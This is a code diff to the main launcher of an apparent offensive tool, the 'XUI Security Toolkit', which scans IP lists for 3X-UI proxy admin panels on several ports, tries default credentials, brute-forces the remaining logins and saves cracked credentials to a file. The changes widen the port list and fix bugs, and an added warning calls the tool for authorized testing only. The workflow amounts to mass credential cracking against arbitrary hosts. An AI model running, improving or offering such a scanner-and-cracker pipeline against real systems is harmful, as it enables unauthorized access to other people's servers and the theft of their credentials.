@@ -3,7 +3,7 @@
 """
 ╔══════════════════════════════════════════════════════════════════════════════╗
 ║                                                                              ║
-║          🔥 XUI SECURITY TOOLKIT v3.0 - ALL-IN-ONE 🔥                       ║
+║          🔥 XUI SECURITY TOOLKIT v3.1 - ALL-IN-ONE 🔥                       ║
 ║           Complete 3X-UI Panel Security Testing Suite                        ║
 ║                                                                              ║
 ║  This is the MAIN entry point that combines:                                ║
@@ -19,14 +19,19 @@
 ║                                                                              ║
 ║  Author: @mansorkorea84                                                      ║
 ║  License: MIT - Educational Purposes Only                                    ║
+║  Version: 3.1 (Enhanced)                                                     ║
 ║                                                                              ║
 ╚══════════════════════════════════════════════════════════════════════════════╝
+
+⚠️  SECURITY WARNING: This tool is for AUTHORIZED security testing only!
+     Unauthorized access to systems is illegal and unethical.
 """
 
 import os
 import sys
 import argparse
 import subprocess
+import time  # FIXED: Missing import that caused NameError
 from datetime import datetime
 
 # Add current directory to path
@@ -47,6 +52,7 @@ class C:
     END = '\033[0m'
     BG_GREEN = '\033[42m'
     BG_BLUE = '\033[44m'
+    DIM = '\033[2m'
 
 # ==================== BANNER ====================
 def print_banner():
@@ -60,10 +66,10 @@ def print_banner():
 {C.RED}║{C.CYAN}   █████╗  ███████║██║   ██║█████╗  ██║   ██║██║   ██║██║  ██║ {C.RED}║
 {C.RED}║{C.CYAN}   ██╔══╝  ██╔══██║██║   ██║██╔══╝  ██║   ██║██║   ██║██║  ██║ {C.RED}║
 {C.RED}║{C.CYAN}   ███████╗██║  ██║╚██████╔╝███████║╚██████╔╝╚██████╔╝██████╔╝ {C.RED}║
-{C.RED}║{C.CYAN}   ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝ ╚═════╝  {C.RED}║
+{C.RED}║{C.CYAN}   ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝  ╚═════╝  {C.RED}║
 {C.RED}║                                                                              ║
 {C.RED}╠══════════════════════════════════════════════════════════════════════════════╣
-{C.RED}║{C.GREEN}       🔥 XUI SECURITY TOOLKIT v3.0 - ALL-IN-ONE SUITE 🔥                {C.RED}║
+{C.RED}║{C.GREEN}       🔥 XUI SECURITY TOOLKIT v3.1 - ALL-IN-ONE SUITE 🔥                {C.RED}║
 {C.RED}║{C.YELLOW}              Scanner + Cracker + Exploiter - Complete                    {C.RED}║
 {C.RED}║{C.MAGENTA}                         Author: @mansorkorea84                      {C.RED}║
 {C.RED}║{C.CYAN}                               [{now}]                              {C.RED}║
@@ -124,13 +130,11 @@ def run_cracker():
         print(f"{C.RED}[-] Error: {e}{C.END}")
 
 def run_full_auto():
-    """Run full automatic workflow"""
-    import time
-    
+    """Run full automatic workflow - enhanced"""
     print_banner()
     print(f"\n{C.MAGENTA}[*] ⚡ FULL AUTO WORKFLOW ⚡{C.END}")
     print(f"{C.CYAN}[*] This will:{C.END}")
-    print(f"    1. Scan IPs to find 3X-UI panels (Port 2053)")
+    print(f"    1. Scan IPs to find 3X-UI panels (Multiple Ports)")
     print(f"    2. Save found panels to file")
     print(f"    3. Run XUI Cracker on found panels")
     print(f"    4. Generate complete report\n")
@@ -144,16 +148,16 @@ def run_full_auto():
         print(f"{C.RED}[-] File not found: {ip_source}{C.END}")
         return
         
-    threads = input(f"{C.CYAN}[?] {C.WHITE}Scanner threads (default 50): {C.END}").strip()
+    threads_input = input(f"{C.CYAN}[?] {C.WHITE}Scanner threads (default 50): {C.END}").strip()
     try:
-        threads = int(threads) if threads else 50
-    except:
+        threads = int(threads_input) if threads_input else 50
+    except (ValueError, TypeError):
         threads = 50
         
-    crack_threads = input(f"{C.CYAN}[?] {C.WHITE}Cracker threads (default 20): {C.END}").strip()
+    crack_threads_input = input(f"{C.CYAN}[?] {C.WHITE}Cracker threads (default 20): {C.END}").strip()
     try:
-        crack_threads = int(crack_threads) if crack_threads else 20
-    except:
+        crack_threads = int(crack_threads_input) if crack_threads_input else 20
+    except (ValueError, TypeError):
         crack_threads = 20
         
     print(f"\n{C.YELLOW}[*] Phase 1/3: Scanning for 3X-UI panels...{C.END}\n")
@@ -168,7 +172,8 @@ def run_full_auto():
             print(f"{C.RED}[-] No IPs loaded!{C.END}")
             return
             
-        found_panels = scanner.quick_scan(ips, ports=[2053], threads=threads)
+        # Scan multiple ports now
+        found_panels = scanner.quick_scan(ips, ports=[2053, 443, 8443, 2083], threads=threads)
         
         if not found_panels:
             print(f"\n{C.YELLOW}[!] No 3X-UI panels found.{C.END}")
@@ -196,7 +201,8 @@ def run_full_auto():
         default_found = app.default_checker.check_targets(targets, threads=crack_threads)
         app.credentials.extend(default_found)
         
-        remaining = [t for t in targets if t.url not in [c.target_url for c in default_found]]
+        found_urls = {c.target_url for c in default_found}
+        remaining = [t for t in targets if t.full_url not in found_urls]
         
         if remaining:
             print(f"\n{C.YELLOW}[*] Phase 3/3: Brute force on remaining targets...{C.END}")
@@ -222,13 +228,16 @@ def run_full_auto():
             from xui_cracker import save_results
             save_results(app.credentials, f"auto_results_{timestamp}.json")
             
+    except ImportError as e:
+        print(f"{C.RED}[-] Import error: {e}{C.END}")
+        print(f"{C.YELLOW}[*] Make sure xui_scanner.py and xui_cracker.py are in the same directory{C.END}")
     except Exception as e:
         print(f"{C.RED}[-] Error: {e}{C.END}")
         import traceback
         traceback.print_exc()
 
 def view_panels():
-    """View previously found panels"""
+    """View previously found panels - enhanced"""
     print(f"\n{C.CYAN}[*] Looking for saved panel lists...{C.END}\n")
     
     files = []
@@ -247,8 +256,11 @@ def view_panels():
     
     for i, f in enumerate(files, 1):
         mtime = datetime.fromtimestamp(os.path.getmtime(f)).strftime('%Y-%m-%d %H:%M')
-        with open(f, 'r') as file:
-            lines = sum(1 for line in file if line.strip() and not line.startswith('#'))
+        try:
+            with open(f, 'r') as file:
+                lines = sum(1 for line in file if line.strip() and not line.startswith('#'))
+        except (IOError, OSError):
+            lines = 0
         print(f"  {C.GREEN}[{i}]{C.WHITE} {f:<40} {C.CYAN}({lines} panels, {mtime}){C.END}")
         
     print()
@@ -259,19 +271,21 @@ def view_panels():
         if 0 <= idx < len(files):
             filename = files[idx]
             print(f"\n{C.YELLOW}[*] Contents of {filename}:{C.END}\n")
-            with open(filename, 'r') as f:
-                content = f.read()
-            print(content)
-            
-            use_for_crack = input(f"\n{C.CYAN}[?] {C.WHITE}Use this file for cracking? (y/n): {C.END}").strip().lower()
-            if use_for_crack == 'y':
-                print(f"\n{C.GREEN}[+] Opening XUI Cracker with this file...{C.END}")
-                # Would launch cracker with this file
-                time.sleep(1)
-                run_cracker()
+            try:
+                with open(filename, 'r') as f:
+                    content = f.read()
+                print(content)
+                
+                use_for_crack = input(f"\n{C.CYAN}[?] {C.WHITE}Use this file for cracking? (y/n): {C.END}").strip().lower()
+                if use_for_crack == 'y':
+                    print(f"\n{C.GREEN}[+] Opening XUI Cracker with this file...{C.END}")
+                    time.sleep(1)
+                    run_cracker()
+            except (IOError, OSError) as e:
+                print(f"{C.RED}[-] Error reading file: {e}{C.END}")
 
 def show_settings():
-    """Show settings/info"""
+    """Show settings/info - enhanced"""
     print_banner()
     
     info = f"""
@@ -279,12 +293,12 @@ def show_settings():
 {C.CYAN}│{C.YELLOW}                          ⚙️  SETTINGS ⚙️                             {C.CYAN}│
 {C.CYAN}├─────────────────────────────────────────────────────────────────────────────┤
 {C.CYAN}│                                                                             │
-{C.CYAN}│{C.WHITE}  Toolkit Version     : {C.GREEN}v3.0{C.WHITE}                                          {C.CYAN}│
+{C.CYAN}│{C.WHITE}  Toolkit Version     : {C.GREEN}v3.1{C.WHITE} (Patched & Enhanced)                   {C.CYAN}│
 {C.CYAN}│{C.WHITE}  Scanner Version     : {C.GREEN}v2.0{C.WHITE} (XUI Scanner Pro)                       {C.CYAN}│
-{C.CYAN}│{C.WHITE}  Cracker Version     : {C.GREEN}v3.0{C.WHITE} (XUI Cracker Enhanced)                  {C.CYAN}│
+{C.CYAN}│{C.WHITE}  Cracker Version     : {C.GREEN}v3.1{C.WHITE} (XUI Cracker Enhanced)                  {C.CYAN}│
 {C.CYAN}│                                                                             │
-{C.CYAN}│{C.WHITE}  Default Scan Port   : {C.YELLOW}2053{C.WHITE} (3X-UI Panel Default)                 {C.CYAN}│
-{C.CYAN}│{C.WHITE}  All Scan Ports     : {C.YELLOW}2053, 443, 8443, 2083, 81, 8080{C.WHITE}             {C.CYAN}│
+{C.CYAN}│{C.WHITE}  Default Scan Ports : {C.YELLOW}2053, 443, 8443, 2083, 81, 8080{C.WHITE}             {C.CYAN}│
+{C.CYAN}│{C.WHITE}  Max Threads        : {C.YELLOW}100{C.WHITE}                                        {C.CYAN}│
 {C.CYAN}│                                                                             │
 {C.CYAN}│{C.WHITE}  Author             : {C.MAGENTA}@mansorkorea84{C.WHITE}                              {C.CYAN}│
 {C.CYAN}│{C.WHITE}  License            : {C.YELLOW}MIT (Educational Only){C.WHITE}                     {C.CYAN}│
@@ -309,9 +323,9 @@ def show_settings():
 
 # ==================== MAIN ====================
 def main():
-    """Main entry point"""
+    """Main entry point - enhanced"""
     parser = argparse.ArgumentParser(
-        description='XUI Security Toolkit v3.0 - All-in-One 3X-UI Security Suite',
+        description='XUI Security Toolkit v3.1 - All-in-One 3X-UI Security Suite',
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
 Examples:
@@ -329,12 +343,7 @@ Examples:
     
     args = parser.parse_args()
     
-    # Import time here to avoid issues
-    global time
-    import time
-    
     if args.full_auto:
-        # Set up for full auto
         sys.argv = ['xui_scanner.py', '--scan', args.full_auto]
         run_full_auto()
     elif args.scan:
